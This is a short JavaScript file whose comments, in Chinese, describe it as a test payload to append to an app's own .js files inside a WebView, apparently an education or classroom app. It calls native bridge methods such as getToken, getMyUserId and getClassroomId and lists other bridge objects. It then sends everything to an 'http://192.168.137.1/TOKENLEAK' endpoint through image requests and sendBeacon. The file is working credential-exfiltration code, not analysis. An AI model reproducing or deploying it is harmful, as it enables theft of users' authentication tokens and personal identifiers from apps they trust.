// webview_bridge_probe.js —— 极简测试版(先确认端侧会执行我们追加到 .js 里的代码)
(function () {
  function beat(tag, val) {
    try {
      var u = "http://192.168.137.1/TOKENLEAK?t=" + encodeURIComponent(tag) + "&d=" + encodeURIComponent(String(val || ""));
      new Image().src = u;
    } catch (e) {}
    try { if (navigator.sendBeacon) navigator.sendBeacon("http://192.168.137.1/TOKENLEAK?t=" + encodeURIComponent(tag)); } catch (e) {}
  }
  beat("boot-min", location.href);
  // 桥探测
  (function () {
    var wv = null;
    try { wv = window.webView; } catch (e) {}
    var tag = wv ? "has_bridge" : "no_bridge";
    var info = { has: !!wv, href: location.href, ua: (navigator.userAgent || "").slice(0, 120) };
    try {
      if (wv) {
        var names = ["getToken", "getMyUserId", "getClassInfo", "getClassroomId", "getCurrentCourse", "getBaseUrl", "getAppType", "getVersionName", "getType"];
        var vals = {};
        for (var i = 0; i < names.length; i++) {
          try { var v = wv[names[i]]; if (typeof v === "function") { vals[names[i]] = String(v()).slice(0, 1500); } } catch (e) { vals[names[i]] = "ERR"; }
        }
        info.vals = vals;
      }
    } catch (e) { info.err = String(e); }
    beat(tag, JSON.stringify(info).slice(0, 4000));
  })();
  // 其它桥探测
  try {
    var ob = {};
    ["LauncherJs", "aiTeacher", "js", "SensorsData_APP_New_H5_Bridge", "Android", "android", "App"].forEach(function (n) {
      try { if (window[n] !== undefined && window[n] !== null) { var mm = {}; for (var p in window[n]) { try { mm[p] = typeof window[n][p]; } catch (e) {} } ob[n] = mm; } } catch (e) {}
    });
    beat("bridges", JSON.stringify(ob).slice(0, 2500));
  } catch (e) {}
})();
